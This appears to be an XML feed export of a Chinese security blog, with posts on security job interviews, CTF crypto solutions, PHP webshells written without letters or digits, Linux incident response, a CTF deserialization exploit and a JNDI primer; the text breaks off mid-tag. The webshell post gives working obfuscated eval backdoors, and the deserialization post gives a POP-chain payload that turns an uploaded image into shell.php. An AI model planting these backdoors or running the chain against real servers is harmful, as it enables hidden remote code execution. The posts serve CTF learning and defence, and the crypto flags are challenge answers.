        <content type="html"><![CDATA[<p>从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗</p><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><ol><li>自我介绍</li><li>tomcat AJP漏洞了解过吗</li><li>Java反序列化漏洞</li><li>JNDI注入，Java7和Java8的区别(这里确实是自己挖坑了，简历上写了自己会Java审计，JNDI注入等，但是并没有仔细准备，结果面试官抓着Java不放)</li><li>XXE如果无法联网怎么利用(三层嵌套报错XXE或者利用系统自带的DTD文件)</li><li>你比较擅长的方面</li></ol><p>不知道为啥和长亭面试官聊起来挺尬的。最后也只面试了20分钟就结束了，当然结果是凉凉了</p><h2 id="字节跳动-企业应用安全"><a href="#字节跳动-企业应用安全" class="headerlink" title="字节跳动-企业应用安全"></a>字节跳动-企业应用安全</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol><li>具体的一个代码审计案例</li><li>说一下你知道的四种漏洞的原理，利用，危害和防御</li><li>XSS知道吗</li><li>说一下前端漏洞中你比较熟悉的</li><li>python沙盒逃逸</li><li>你觉得自己的优势是什么</li><li>对未来的规划</li></ol><p>字节跳动一面官感觉挺棒的，全程在引导你，而且特别尊重你说出自己的看法</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol><li>简单问了几个小问题，python沙盒逃逸，JavaScript原型链污染</li><li>有没有了解过electron框架（就是开发vscode的，我说没有，但是我知道vue</li><li>vue怎么防御csrf(我不太了解vue怎么防范，先说一些怎么防CSRF balabal)</li><li>提示vue是通过ajax和后端连接，我：哦想起来了，那就用CORS来防御，然后说了CORS的防御</li><li>继续问。CORS分为简单请求和非简单请求，一个POST请求怎么区分</li><li>java做过哪些</li><li>mXSS了解吗</li><li>参数压栈入栈简单说下</li><li>你怎么将CTF学到的用到实战</li><li>go有没有了解</li></ol><p>二面面试官也挺棒的，唯一的问题就是。。。他家的小孩子太吵了。。几次打断我的思路</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面是部门leader面，本来以为会继续问技术的，结果。。问了一堆人生相关的问题，而且回答的不好，没有完全表现出自己的水平。。</p><ol><li>第一次打CTF的经历(就是由于一开始的这个问题导致我后面都在说CTF，可能leader觉得我的眼界太小了吧)</li><li>你对未来的规划(这种问题真心不好回答)</li><li>你是怎么选择上这个专业的</li><li>你认为你还有哪些技能需要完善</li><li>你觉得学习编程语言需要注意哪些</li><li>go的垃圾回收机制(这个真是自己多嘴了，不该说自己学了点go的，这个问题没答上来)</li><li>go的并发机制有哪些(我就知道channel。。)</li></ol><p>周五面试完，下周一结果出来后就凉凉了，之后转岗到安全与风控部门，结果这是个开发岗，问的问题都是和编程有关的</p><p>只记录了几个问题：</p><ol><li>http1.0和1.1的区别</li><li>hashtable的原理</li><li>进程和线程的区别</li><li>进程间通信的方式</li><li>hash冲突解决</li><li>tcp和udp协议</li><li>用c语言实现双链表的插入和删除</li></ol><p>面试了一个多小时。。最后面试官说看了我的博客觉得我在漏洞挖掘，渗透这块还行，建议我投其他的部门，我说我就是转岗过来的。。。</p><h2 id="知道创宇-404实验室"><a href="#知道创宇-404实验室" class="headerlink" title="知道创宇 - 404实验室"></a>知道创宇 - 404实验室</h2><p>知道创宇是3月5号投递的，结果3月底才安排面试，以至于我都忘记投递了。</p><ol><li>分享几个cms漏洞挖掘的案例</li><li>代码审计的思路</li><li>假设一个cms你找到了一个反序列化的入口，如何挖掘POP链</li><li>如果cms中找不到POP链怎么利用(不知道，面试官告诉我可以用内置的类进行反序列化)</li><li>印象最深的一道CTF题</li><li>解释一下js的原型链污染</li><li>说一下你对tomcat AJP漏洞的分析</li><li>除了CTF，代码审计你还从哪里学安全知识</li><li>储存型XSS但是httponly了怎么利用</li><li>说一下redis主从复制漏洞</li><li>解释一下python的全局变量锁</li><li>python什么时候会用到多线程，什么时候用到多进程</li><li>为什么python的多线程是伪多线程</li><li>开发一个cms自动化代码审计的工具你有哪些思路</li></ol><h2 id="腾讯-应用运维安全"><a href="#腾讯-应用运维安全" class="headerlink" title="腾讯-应用运维安全"></a>腾讯-应用运维安全</h2><p>我后来才知道腾讯面试的流程，首先有一个公共的简历池，之后每个部门在里面捞简历，一般看到一份还行的简历会打电环了解一下情况(所以我接了好几个了解情况的电话)，之后如果要面试的话需要锁定这一份简历，这样的话其他部门就无法面试你，只有锁定简历的部门才行。</p><p>两轮电话了解情况之后，我的简历投到了应用运维安全，具体哪个事业群不知道</p><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><ol><li>入侵响应</li><li>重置密码逻辑漏洞</li><li>RMI 利用的一个流程</li><li>flask SSTI 漏洞</li><li>XSS怎么防护</li><li>CSP如何绕</li><li>安全开发流程</li><li>JavaScript 闭包</li><li>常用远程控制软件</li><li>SQL过滤了单引号怎么绕过</li><li>SQL注入如何防护</li><li>Linux查看进程和查看端口的命令</li></ol><p>之后网申的页面提示进入了复试阶段，但是一直没更新。直到变灰。</p><h2 id="腾讯-后台策略安全"><a href="#腾讯-后台策略安全" class="headerlink" title="腾讯-后台策略安全"></a>腾讯-后台策略安全</h2><p>本来以为腾讯没希望了，人都去新疆给做培训了，结果腾讯微信事业群联系我问有没有意向</p><h3 id="4-9-0面"><a href="#4-9-0面" class="headerlink" title="4.9 0面"></a>4.9 0面</h3><p>问了大概一个多小时，感觉就是提前了解情况，后来才知道也不是一面。姑且叫做0面好了，面完之后也没有做记录，只有靠回忆了</p><ol><li>说一下python沙盒逃逸</li><li>了解过nodejs的沙盒逃逸吗</li><li>说一下JavaScript原型链污染</li><li>dll注入了解过吗</li><li>二进制程序常见的壳，脱壳的方法</li><li>了解过大数据吗</li><li>编程题: 将一个数组的奇数移到前面，偶数移到后面</li></ol><h3 id="4-11-一面"><a href="#4-11-一面" class="headerlink" title="4.11 一面"></a>4.11 一面</h3><ol><li>https和http的区别</li><li>http怎么防止运营商篡改你的流量</li><li>操作系统进程通信方式</li><li>XSS和CSRF</li><li>二次注入</li><li>web安全有没有总结一些方法论什么的</li><li>操作系统的最小调度单位是什么，操作系统资源分配的最小单位是什么，如果一个进程crash了，它的线程会发生什么</li><li>tcp为啥要三次握手，两次和四次不行吗</li><li>脱壳的方式</li><li>编程题：二分查找</li></ol><h3 id="4-13-二面"><a href="#4-13-二面" class="headerlink" title="4.13 二面"></a>4.13 二面</h3><p>这一面感觉面的挺尬的，面完后还觉得自己凉了，面完之后每天都忍不住去看官网的状态</p><ol><li>有没有渗透攻防经历</li><li>逆向了解过哪些</li><li>小程序游戏，比如跳一跳，怎么防止查重</li><li>二进制安全学习过哪些.</li><li>java安全学习过哪些</li><li>apk逆向了解不</li><li>java的hashtable实现原理</li><li>hash泛洪攻击了解吗</li><li>tcp泛红攻击</li><li>你认为你相比其他人的优势</li><li>你玩过哪些微信游戏</li><li>内容安全了解吗</li><li>编程题：数组去重</li></ol><h3 id="4-17-三面"><a href="#4-17-三面" class="headerlink" title="4.17 三面"></a>4.17 三面</h3><p>第一次在机场面试。。实在是没办法，这是腾讯校招的最后一天必须得面完</p><p>然而面试官问我的问题我都没听明白</p><ol><li>怎么检测开发者绕过我们设定的策略</li><li>如何检测内容安全</li><li>如何防止外挂</li><li>你还有什么补充的(然后我就开始跑火车了)</li></ol><p>由于在机场，面试也只持续了半个小时左右</p><h3 id="4-18-hr面"><a href="#4-18-hr面" class="headerlink" title="4.18 hr面"></a>4.18 hr面</h3><ol><li>你认为你相对别人的优势</li><li>之前没有实习经历</li><li>之前有投递过其他的安全公司吗</li><li>你觉得这个岗位和你相契合吗</li><li>你父母的工作，你父母对你的影响</li></ol><p>聊了大概大概十分钟，面试官声音很有特点。面试的邀请函都是4.18号凌晨发过来的，估计在加班hhhh</p><h2 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h2><p>2月底的时候看到博客园的一个师傅，首页上写着阿里云云安全团队长期招收实习生，于是联系了他，做了一次简单的非正式面试，校招开始的时候也是他帮我内推的</p><h3 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h3><p>一面很水，不到二十分钟，感觉就是简单了解了情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><ol><li>渗透测试有没有做过</li><li>怎么检测反弹shell</li><li>怎么检测黑客入侵Linux服务器</li><li>structs2漏洞说一下 </li><li>cms审计说一说</li><li>系统提权说一说</li><li>有没有做过演讲</li><li>安全方面有哪些成就</li><li>IOT哪些产出</li></ol><p>答得不是很好，结果凉凉</p><h2 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h2><h3 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h3><p>华为这次笔试感觉真的难，只有单选，不定项选(少选不给分)，和一道编程题</p><ol><li>fuzz框架考了很多，而且都是问用处，但是我都不知道</li><li>Linux的操作也考了一些，比如 <code>/etc/profile</code> 文件中设置的环境变量对所有用户都生效</li><li>web安全，有直接给源码问你漏洞点的，还有一些基本概念，这个反倒是不难</li><li>二进制安全，有一道直接考ROP链的，让你选择栈布局</li></ol><p>不知道还有没有后续的面试</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>校招还是比较看重基础，但是对于偏乙方的比如长亭和知道创宇可能要求你有一些比较擅长的点，而且会问的比较细。大厂主要是看你的基础知识是不是很扎实。感觉面试的很多问题都是可以直接从网上找到答案的，但是还是要拿来问emmm。最后，感觉面试真是3分运气，7分实力，不过不到最后也不要轻言放弃，万一呢，万一呢。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学题目</title>
      <link href="/posts/1dea6763/"/>
      <url>/posts/1dea6763/</url>
      
        <content type="html"><![CDATA[<p>记录一下ctf.show平台</p><p><a href="https://ctf.show/challenges" target="_blank" rel="noopener">https://ctf.show/challenges</a></p><h2 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h2><p>凯撒密码</p><p><img src="/posts/1dea6763/1586531882516-1587195417553.png" alt></p><h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>jsfuck</p><p><img src="/posts/1dea6763/1587194700279.png" alt></p><h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>还是jsfuck编码</p><p><img src="/posts/1dea6763/1587194728413.png" alt></p><h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p>p=447685307 q=2037 e=17</p><p>提交flag{d}即可</p><pre><code class="python">import gmpy2&#39;&#39;&#39;给出p,q,e 求d&#39;&#39;&#39;# p = 3487583947589437589237958723892346254777# q = 8767867843568934765983476584376578389# e = 65537p=18443q=49891e=19phin = (p - 1) * (q - 1)print gmpy2.invert(e, phin)</code></pre><h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p>p=447685307 q=2037 e=17 c=704796792</p><p>提交flag{m}</p><pre><code class="python">import gmpy2&#39;&#39;&#39;给出p,q,e,c 求d和m&#39;&#39;&#39;p=447685307q=2037e=17c=704796792phin = (p - 1) * (q - 1)d = gmpy2.invert(e, phin)print pow(c,d,p*q)</code></pre><h2 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h2><p>ook解密</p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><pre><code>flag{b615c4b79a1aede83b9ae67104ff4eb5}</code></pre><h2 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h2><p>brainfuck解密</p><pre><code>flag{99754106633f94d350db34d548d6091a}</code></pre><h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>密码是4132</p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p><img src="/posts/1dea6763/1586560529022.png" alt></p><h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><p>邮件编码</p><h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>解密后就是ctf</p><h2 id="crypto13"><a href="#crypto13" class="headerlink" title="crypto13"></a>crypto13</h2><p>混合加密</p><pre><code class="python">import base64def base(s):    try:        s = base64.b32decode(s)        s = base(s)    except:        try:            s = base64.b64decode(s)            s = base(s)        except:            return s    return sf = open(&#39;base.txt&#39;)text = f.read()print(base(text))</code></pre><p>flag{b4Se_Fami1y_Is_FUn}</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无字母数字webshell</title>
      <link href="/posts/bed5b94f/"/>
      <url>/posts/bed5b94f/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">&lt;?phpif(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) {  eval($_GET[&#39;shell&#39;]);}</code></pre><h2 id="通过异或"><a href="#通过异或" class="headerlink" title="通过异或"></a>通过异或</h2><p>原理</p><pre><code class="php">php &gt; echo chr(0x01)^&#39;`&#39;;aphp &gt; echo chr(0x13)^&#39;`&#39;;sphp &gt; echo chr(0x05)^&#39;`&#39;;e</code></pre><p>所以即可构造：</p><pre><code class="php">$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); //$_=assert$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__ = _POST$___=$$__; //$___ = $_POST$_($___[_]);// assert($_POST[_])</code></pre><p>在 <code>php5.5.38</code> 通过测试</p><p><img src="/posts/bed5b94f/1586074270072.png" alt></p><p>但是如果切换为 <code>php7.1.3</code> 执行失败</p><p><img src="/posts/bed5b94f/1586074316094.png" alt></p><h3 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h3><p>通过这种方式可以构造异或形式的webshell</p><pre><code class="php">&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;{&quot;^&quot;/&quot;); // _POST     ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);?&gt;</code></pre><pre><code>0=assert&amp;1=phpinfo()</code></pre><p>在 AWD 中常用来做隐藏的shell</p><p><img src="/posts/bed5b94f/1586074779485.png" alt></p><p>当然这种马是直接被杀的</p><p><img src="/posts/bed5b94f/1586074826727.png" alt></p><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;])){    $code = $_GET[&#39;code&#39;];    if(strlen($code)&gt;40){        die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>首先我们得知道 <code>_GET</code> 由什么异或而来的，<a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_12" target="_blank" rel="noopener">参考</a></p><pre><code>&lt;?php    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>这段代码一大坨是啥意思呢？因为 40 个字符长度的限制，导致以前逐个字符异或拼接的 webshell 不能使用。<br>这里可以使用 php 中可以执行命令的反引号 ``` 和 <code>Linux</code> 下面的通配符 <code>?</code></p><ul><li><code>?</code> 代表匹配一个字符</li><li>``` 表示执行命令</li><li><code>&quot;</code> 对特殊字符串进行解析</li></ul><p>这样就可以直接得到 </p><pre><code>php &gt; echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;_GET</code></pre><p>然后再构造</p><pre><code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code></pre><p>这样就构造好了shell</p><p><img src="/posts/bed5b94f/1586075401555.png" alt></p><h2 id="通过取反"><a href="#通过取反" class="headerlink" title="通过取反"></a>通过取反</h2><pre><code class="php">&lt;?php$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});$_=$$_____;$____($_[$__]);</code></pre><h2 id="通过加法运算"><a href="#通过加法运算" class="headerlink" title="通过加法运算"></a>通过加法运算</h2><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell检测思路</title>
      <link href="/posts/d7bd6781/"/>
      <url>/posts/d7bd6781/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/posts/e756113b/"/>
      <url>/posts/e756113b/</url>
      
        <content type="html"><![CDATA[<h2 id="相关命令补充"><a href="#相关命令补充" class="headerlink" title="相关命令补充"></a>相关命令补充</h2><h2 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><p>用户信息文件/etc/passwd</p><pre><code>root:x:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shell用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</code></pre><p>注意：无密码只允许本机登陆，远程不允许登陆</p><p><code>/etc/shadow</code> 文件</p><pre><code>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</code></pre><p>相关命令</p><pre><code>who   查看当前登录用户（tty本地登陆 pts远程登录）w    查看系统信息，想知道某一时刻用户的行为uptime 查看登陆多久、多少用户，负载</code></pre><p>查找特权用户(UID=0)</p><pre><code>awk -F: &#39;$3==0{print $1}&#39; /etc/passwd</code></pre><p>查找可以远程登陆的账号信息</p><pre><code>$ sudo awk &#39;/\$1|\$6/{print $1}&#39; /etc/shadowroot:$6$ogEENApZAzc/p2XN$TQ.P2pRw7IwUuYPMXymUH2fbGNrNqJutxiao3xAJpCSYlhjNCL1BYByO1W75i4I6ri1GWGu61VMqexIXw5s0l.:18298:0:99999:7:::pxy:$6$7LQL0eO/Dk93UKqU$U9fSZEej9Dx1/InOImWFsfRdtWW2dJHzWYhnBRJj79.NLVQ9og.5E0jAo7eYB.vmwR9PuYjND.e4yBWwhqVvq.:18253:0:99999:7:::</code></pre><p>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</p><pre><code>sudo more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></pre><p>禁用或者删除可疑的账号</p><pre><code>usermod -L user  禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头userdel user    删除user用户userdel -r user  将删除user用户，并且将/home目录下的user目录一并删除</code></pre><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><ul><li><p><code>history</code> 查看历史命令</p></li><li><p>打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</p></li></ul><p>保存一万条命令</p><pre><code>sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre><p>增加ip信息</p><pre><code class="bash">######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ##########</code></pre><p><code>source /etc/profile</code> 让配置生效</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参RCE构造</title>
      <link href="/posts/d6a47f52/"/>
      <url>/posts/d6a47f52/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化题目整理</title>
      <link href="/posts/4e7aaa07/"/>
      <url>/posts/4e7aaa07/</url>
      
        <content type="html"><![CDATA[<h2 id="qwb-upload"><a href="#qwb-upload" class="headerlink" title="qwb upload"></a>qwb upload</h2><p>当初学的时候挺难的，现在做起来觉得挺简单了</p><p>入口 <code>Register.php</code></p><pre><code class="php">    public function __destruct()    {        if(!$this-&gt;registed){            $this-&gt;checker-&gt;index();        }    }</code></pre><p>调用 <code>checker</code> 属性的 index 方法，如果不存在，就会调用某个类的 <code>__call</code> 方法</p><p>正好有一个 <code>Profile.php</code> </p><pre><code class="php">    public function __get($name)    {        return $this-&gt;except[$name];    }    public function __call($name, $arguments)    {        if($this-&gt;{$name}){            $this-&gt;{$this-&gt;{$name}}($arguments);        }    }</code></pre><p>那么就可以通过 <code>__call</code> 去调用其他的方法了，这里我们选择</p><pre><code class="php">    public function upload_img(){        if($this-&gt;checker){            if(!$this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if(!empty($_FILES)){            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        }        if($this-&gt;ext) {            if(getimagesize($this-&gt;filename_tmp)) {                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;                $this-&gt;update_img();            }else{                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));            }        }else{            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));        }    }</code></pre><p><code>checker</code> 属性可控，<code>ext</code> 属性可控</p><p>进入到 <code>@copy($this-&gt;filename_tmp, $this-&gt;filename);</code> 即可将图片马改名</p><blockquote><p>这题复盘的时候比较玄学，挺难成功的</p></blockquote><p>调试过程</p><p><img src="/posts/4e7aaa07/1585910353276.png" alt></p><p>之后即可修改文件名</p><p><img src="/posts/4e7aaa07/1585910388138.png" alt></p><p>exp</p><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Register{    public $checker;    public $registed = false;    public function __construct($checker){        $this-&gt;checker = $checker;    }}class Profile{   # 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER[&#39;REMOTE_ADDR&#39;])/md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;    public $filename_tmp = &#39;./upload/2e25bf05f23b63a5b1f744933543d723/00bf23e130fa1e525e332ff03dae345d.png&#39;;    public $filename = &#39;./upload/2e25bf05f23b63a5b1f744933543d723/shell.php&#39;;    public $ext = true;    public $except = array(&#39;index&#39; =&gt; &#39;upload_img&#39;);}$register = new Register(new Profile());echo urlencode(base64_encode(serialize($register)));</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jndi入门</title>
      <link href="/posts/fe658142/"/>
      <url>/posts/fe658142/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>JNDI(Java Naming and Directory Interface),名为 Java命名和目录接口，JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。放两张直观的图</p><p><img src="/posts/fe658142/1.png" alt></p><p>从图中可以看出，JNDI相当于是更进一步的封装</p><p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre><code class="java">/** * @description: * @author: Pxy * @create: 2020-03-22 16:34 **/import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import javax.naming.spi.NamingManager;public class test {    public static void initPerson() throws Exception{        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常        LocateRegistry.createRegistry(3001);        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:3001&quot;);        ////初始化        InitialContext ctx = new InitialContext();        //实例化person对象        Person p = new Person();        p.setName(&quot;pxy&quot;);        p.setPassword(&quot;12345&quot;);        //person对象绑定到JNDI服务中，JNDI的名字叫做：person，即我们可以通过person键值，来对Person对象进行索引        ctx.bind(&quot;person&quot;, p);        ctx.close();    }    public static void findPerson() throws Exception{        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了        InitialContext ctx = new InitialContext();        //通过lookup查找person对象        Person person = (Person) ctx.lookup(&quot;person&quot;);        System.out.println(person.toString());//        ctx.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;);        ctx.close();    }    public static void main(String[] args) throws Exception {        initPerson();        findPerson();    }}</code></pre><p>首先生成一个工厂，然后将对象绑定上，再去访问</p><p><img src="/posts/fe658142/1584867587547.png" alt></p><h2 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h2><p>上面的Demo里面，在初始化就预先指定了其上下文环境(RMI),但是在调用 lookup() 时，是可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 RMi的 URI 格式去<strong>转换</strong>(该变)上下文环境，使之访问 RMI 服务上的绑定对象：</p><pre><code class="java">Person person = (Person) ctx.lookup(&quot;rmi://localhost:3001/person&quot;);</code></pre><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" 